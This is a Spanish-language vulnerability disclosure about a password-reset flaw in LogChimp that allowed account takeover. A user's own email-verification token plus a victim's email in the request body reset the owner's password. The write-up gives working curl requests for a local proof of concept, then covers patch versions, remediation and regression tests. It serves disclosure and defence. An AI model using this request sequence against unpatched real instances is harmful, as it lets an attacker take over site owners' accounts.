Token confusion to ATO_

HighAccount takeoverResponded
Source Code ReviewAccount TakeoverPassword ResetNode.js

Durante una revisión de seguridad de LogChimp encontré un fallo en el flujo de restablecimiento de contraseña que me permitió cambiar la contraseña de otra cuenta utilizando un token válido de mi propio usuario.

La vulnerabilidad aparecía porque el endpoint validaba el token y recuperaba su correo asociado, pero el siguiente middleware permitía reemplazar esa identidad con un campo email enviado en el body. Además, la ruta aceptaba un token de verificación de correo donde debía exigir uno de restablecimiento de contraseña.

En mi instancia local utilicé un token emailVerification de una cuenta normal para restablecer la contraseña del propietario del sitio. Después inicié sesión como ese propietario y accedí a funcionalidad restringida.

LogChimp publicó posteriormente un security update para corregir el problema. El parche llegó en v0.9.1 y fue llevado a la rama anterior en v0.8.4. La recomendación actual es instalar la versión más reciente disponible de cada rama; en el momento de documentar esta investigación eran v0.9.2 y v0.8.5.

Toda la reproducción se realizó en una instancia local controlada. Los correos, tokens e identificadores de esta publicación son sintéticos.

El flujo que esperaba encontrar

Un endpoint de password reset debería resolver la cuenta exclusivamente desde el token verificado:

token de reset
    ↓
validar firma, expiración y propósito
    ↓
obtener el usuario asociado al token
    ↓
cambiar la contraseña de ese mismo usuario

En este caso, el sujeto validado podía cambiar a mitad del flujo.

Cómo se perdía el binding

La ruta estaba registrada con tres pasos:

router.post(
  "/auth/password/set",
  validateEmailToken,
  userExists,
  auth.password.set,
);

validateEmailToken verificaba el token y dejaba en la request el correo vinculado a ese registro:

req.user = { email: emailToken.email };
req.ctx.token = emailToken;

Hasta ese punto, la identidad dependía del token. El problema aparecía en userExists, donde el correo del body tenía prioridad:

let email = (
  (req.body ? req.body.email : "") ||
  (req.user ? req.user.email : "")
).toLowerCase();

Si yo incluía email en el JSON, el middleware buscaba esa cuenta y reemplazaba req.user con su registro. El controlador final actualizaba la contraseña mediante req.user.userId, que ya correspondía a la víctima.

La secuencia real quedaba así:

token válido del atacante
    ↓
req.user.email = attacker@example.test
    ↓
body.email = owner@example.test
    ↓
userExists prioriza body.email
    ↓
req.user pasa a ser el propietario
    ↓
password.set actualiza al propietario

El token demostraba control sobre una cuenta, pero el password reset terminaba actuando sobre otra.

Un segundo fallo: confusión de propósito

La ruta tampoco comprobaba que el token fuera de tipo resetPassword. Durante la prueba aceptó un token con este contenido lógico:

{
  "email": "attacker@example.test",
  "type": "emailVerification"
}

Validar la autenticidad de un token no es suficiente. También hay que validar que haya sido emitido para la operación que intenta autorizar. Un token de verificación de correo no debería ser intercambiable con uno de recuperación de contraseña.

Prueba de concepto local

Primero generé una cuenta normal y obtuve su token de verificación. Después envié ese token al endpoint de password reset junto con el correo del propietario:

jq -n \
  --arg token "<ATTACKER_EMAIL_VERIFICATION_TOKEN>" \
  --arg email "owner@example.test" \
  --arg password "NewOwnerPass123!" \
  '{token:$token,email:$email,password:$password}' |
curl -i -X POST "http://localhost:8000/api/v1/auth/password/set" \
  -H "Content-Type: application/json" \
  --data-binary @-

La API confirmó el cambio:

HTTP/1.1 200 OK
Content-Type: application/json

{"reset":{"success":true}}

Después inicié sesión con el correo del propietario y la contraseña que acababa de elegir:

curl -s -X POST "http://localhost:8000/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "email":"owner@example.test",
    "password":"NewOwnerPass123!"
  }'

La respuesta devolvió una sesión de propietario:

{
  "user": {
    "authToken": "<OWNER_AUTH_TOKEN>",
    "userId": "<OWNER_USER_ID>",
    "name": "Admin",
    "email": "owner@example.test"
  }
}

Finalmente utilicé ese token contra una función restringida:

curl -i "http://localhost:8000/api/v1/users" \
  -H "Authorization: Bearer <OWNER_AUTH_TOKEN>"

La respuesta autorizada confirmó que el impacto no se limitaba a cambiar la contraseña: podía asumir la sesión y los permisos de la cuenta afectada.

Impacto

Cualquier usuario con un token propio válido podía restablecer la contraseña de otra cuenta si conocía su correo. En una instalación con registro público, una persona podía crear una cuenta nueva y utilizar su propio token para tomar el control del propietario del sitio.

La puntuación técnica que calculé fue 8.8 High. Desde el punto de vista operativo, el takeover del propietario podía exponer administración de usuarios, configuración del sitio, roles y permisos.

Publicación del parche

El proyecto publicó el aviso Security Update — Critical Vulnerability Patch y recomendó a todos los responsables de instancias self-managed actualizar inmediatamente.

La corrección se distribuyó en dos ramas:

  1. v0.9.1 para la serie 0.9.x.
  2. v0.8.4 como backport para la serie 0.8.x.

Después se publicaron v0.9.2 y v0.8.5. Por eso la recomendación práctica no es quedarse en la primera versión parcheada, sino instalar el release más reciente de la rama utilizada.

El crédito de esta investigación se publicó como @ZsZsec.

Remediación

El endpoint debe resolver la cuenta únicamente desde el token verificado. El body no debería aceptar un campo email para esta operación.

También aplicaría estas comprobaciones:

  1. Exigir que el token tenga el propósito exacto resetPassword.
  2. Comprobar expiración, uso único y revocación del token.
  3. Validar el esquema del body y rechazar campos inesperados.
  4. Evitar que middlewares posteriores reemplacen el sujeto autenticado.
  5. Invalidar sesiones existentes después del cambio de contraseña.

Pruebas de regresión

La corrección debería incluir al menos estos casos:

token de usuario A + email de usuario B  → rechazado
emailVerification en password/set       → rechazado
resetPassword expirado                  → rechazado
resetPassword ya utilizado              → rechazado
resetPassword válido de usuario A       → solo cambia usuario A

Estado

La vulnerabilidad fue confirmada en una instancia local sobre LogChimp v0.9.0 y el master disponible durante la revisión. El proyecto publicó la corrección en v0.9.1 y su backport en v0.8.4, con crédito para @ZsZsec. Los mantenedores deberían actualizar a la versión más reciente disponible.
